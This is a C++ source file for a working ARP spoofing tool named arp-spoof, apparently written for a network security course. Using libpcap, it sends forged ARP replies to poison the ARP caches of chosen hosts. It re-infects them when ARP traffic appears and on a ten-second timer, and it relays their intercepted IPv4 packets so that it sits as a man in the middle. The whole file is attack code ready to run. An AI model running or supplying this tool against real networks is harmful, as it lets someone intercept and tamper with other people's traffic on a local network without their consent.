#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h> 
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"
#include <vector>
#include <pthread.h>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

// code from send-arp-test until 122 line

Mac get_my_mac(const char* interface){
    struct ifreq ifr;
    int fd;
    uint8_t mac_addr[6];

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0){    
        printf("get_my_mac fail. cannot open socket.\n");
        exit(0);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ); 
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        printf("get_my_mac fail. cannot get mac. please write right interface.\n");
        close(fd);
        exit(0);
    }

    close(fd);
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    return Mac(mac_addr);
}

Ip get_my_ip(const char* interface){
    struct ifreq ifr;
    int fd;
    char ip_addr[40];

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0){
        printf("get_my_ip fail. cannot open socket.\n");
        exit(0);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        printf("get_my_ip fail. cannot get ip. please write right interface.\n");
        close(fd);
        exit(0);
    }

    close(fd);
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip_addr, sizeof(struct sockaddr));
    return Ip(ip_addr);
}

Mac get_sender_mac(pcap_t* handle, Mac atk_mac, Ip atk_ip, Ip send_ip) {
    EthArpPacket arpRequest; //first, make an arp request

    arpRequest.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    arpRequest.eth_.smac_ = atk_mac;
    arpRequest.eth_.type_ = htons(EthHdr::Arp);

    arpRequest.arp_.hrd_ = htons(ArpHdr::ETHER);
    arpRequest.arp_.pro_ = htons(EthHdr::Ip4);
    arpRequest.arp_.hln_ = Mac::SIZE;
    arpRequest.arp_.pln_ = Ip::SIZE;
    arpRequest.arp_.op_ = htons(ArpHdr::Request);
    
    arpRequest.arp_.smac_ = atk_mac;
    arpRequest.arp_.sip_ = htonl(atk_ip); 
    arpRequest.arp_.tmac_ = Mac("00:00:00:00:00:00");
    arpRequest.arp_.tip_ = htonl(send_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpRequest), sizeof(EthArpPacket));
    if (res != 0) { //second, send and arp request packet
        printf("get_sender_mac fail. cannot send packet.\n");
        exit(0);
    }

    EthArpPacket *arpReply;
    struct pcap_pkthdr* header;
    const u_char* packet;
    while(true){ //thrid, receive arp response packet
        res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue; 
        if (res == -1 || res == -2) {
            printf("get_sender_mac fail. pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(0);
        }
        //last, check whether it is right arp response
        arpReply = (EthArpPacket*) packet;
        
        if((arpReply->eth_.type_ == htons(EthHdr::Arp)) && (arpReply->arp_.op_ == htons(ArpHdr::Reply)) 
                && (arpReply->arp_.sip() == send_ip))
            return arpReply->arp_.smac_;
        
        printf("you got wrong arp response. try again please.\n");
        exit(0);
    }

}
// Significant_variables
int flow_number;
vector<Ip> sender_ip_table;
vector<Ip> target_ip_table;
vector<Mac> sender_mac_table;

void arp_infection(pcap_t* handle, Mac atk_mac, Mac send_mac, Ip send_ip, Ip tar_ip){
    
    EthArpPacket packet;

    packet.eth_.dmac_ = send_mac;
    packet.eth_.smac_ = atk_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = atk_mac;
    packet.arp_.sip_ = htonl(Ip(tar_ip));
    packet.arp_.tmac_ = send_mac;
    packet.arp_.tip_ = htonl(Ip(send_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        printf("arp_infection fail. pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void arp_spoof(pcap_t* handle, Mac atk_mac, Ip atk_ip){
    //0. Declare
    int res;
    struct pcap_pkthdr* header;
    const u_char* packet;
    EthArpPacket* r_packet;
    // 1. Initial infect
    printf("\n   * infect ARP table\n");
    for (int i=0;i<flow_number;i++){
        printf("\nFlow %d\n",i);
        printf("[Sender IP] : %s\n",sender_ip_table[i].operator string().c_str());
        printf("[Target IP] : %s\n",target_ip_table[i].operator string().c_str());
        printf("[Sender MAC] : %s\n",sender_mac_table[i].operator string().c_str());
        arp_infection(handle, atk_mac, sender_mac_table[i], sender_ip_table[i], target_ip_table[i]);
    }
    // 2. relay or re-infect
    printf("\n   * relay OR re-infect\n");
    while(true){
        res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue; 
        if (res == -1 || res == -2) {
            printf("relay OR re-infect fail. pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(0);
        }
        r_packet = (EthArpPacket *)packet; //received packet.

        if(r_packet->eth_.type_ == htons(EthHdr::Arp)){ //Arp packet? re-infect!
            for (int i = 0; i<flow_number; i++)
            { // check all flow.
                if( r_packet->arp_.sip_== Ip(htonl(target_ip_table[i])) || 
                r_packet->arp_.sip_== Ip(htonl(sender_ip_table[i]))){//from sender or target.
                    printf("\n[Re-infection to IP] : %s\n",sender_ip_table[i].operator string().c_str());
                    arp_infection(handle, atk_mac, sender_mac_table[i], sender_ip_table[i], target_ip_table[i]);
                }
            }
        }
        else if(r_packet->eth_.type_ == htons(EthHdr::Ip4)){ //Ipv4 packet? relay!
            if(r_packet->eth_.dmac_ != atk_mac) continue; //destination should be atk mac
            Ip dest_ip(ntohl(*((int *)(packet+14+16)))); 

            for (int i = 0; i<flow_number; i++){
                if(r_packet->eth_.smac_ == sender_mac_table[i] && dest_ip == target_ip_table[i])
                {//check smac & dip.
                    printf("\n[Relay Packet] sender : %s target : %s\n",
                        sender_ip_table[i].operator string().c_str(),target_ip_table[i].operator string().c_str());

                    u_char * relay_packet = (u_char *)malloc(header->caplen);
                    memcpy(relay_packet,packet,header->caplen);
                    ((EthHdr*)relay_packet)-> smac_ = atk_mac;
                    ((EthHdr*)relay_packet)-> dmac_ = get_sender_mac(handle, atk_mac, atk_ip, target_ip_table[i]);

                    int res = pcap_sendpacket(handle, relay_packet,header->caplen);
                    if (res != 0) {
                        printf("relay packet send error..\n");
                        exit(0);
                    }
                    free(relay_packet);
                    break; //exit for()
                }
            }
        }
    }
    return;
}

typedef struct {
    pcap_t* a;
    Mac b;
}thread_args;

int count = 0;

void *infect_repeat(void *arg){ // always repeating infect.
    thread_args* args = (thread_args *)arg;
    pcap_t *handle = args->a;
    Mac atk_mac = args->b;
    while(1){
        printf("\n   * infect repeat count : %d\n",++count);
        for (int i=0;i<flow_number;i++)
            arp_infection(handle, atk_mac, sender_mac_table[i], sender_ip_table[i], target_ip_table[i]);
        sleep(10);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc%2) { //wrong input : argc less than 4 or odd number
        usage();
        return -1; 
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1; 
    }
    
    Mac atk_mac = get_my_mac(argv[1]);
    printf("[Attacker Mac] : %s\n",atk_mac.operator string().c_str());
    Ip atk_ip = get_my_ip(argv[1]);
    printf("[Attacker Ip] : %s\n",atk_ip.operator string().c_str());

    flow_number = (argc-2)/2;
    for (int i=2; i<argc; i+=2){
        Ip sender_ip(argv[i]); // make Ip by constructor
        Ip target_ip(argv[i+1]);
        sender_ip_table.push_back(sender_ip); // construct Ip table
        target_ip_table.push_back(target_ip);

        Mac sender_mac = get_sender_mac(handle, atk_mac, atk_ip, sender_ip);
        sender_mac_table.push_back(sender_mac); // construct sender Mac table
    } 

    pthread_t thread; // pthread : to repeat infection periodcially. 
    thread_args temp;
    temp.a = handle;
    temp.b = atk_mac;
    if(pthread_create(&thread, NULL, infect_repeat, &temp)!=0){
        printf("pthread_create fail.\n");
        return -1;
    } 
    
    arp_spoof(handle, atk_mac, atk_ip); //arp spoof

    pcap_close(handle);
	return 0;
}
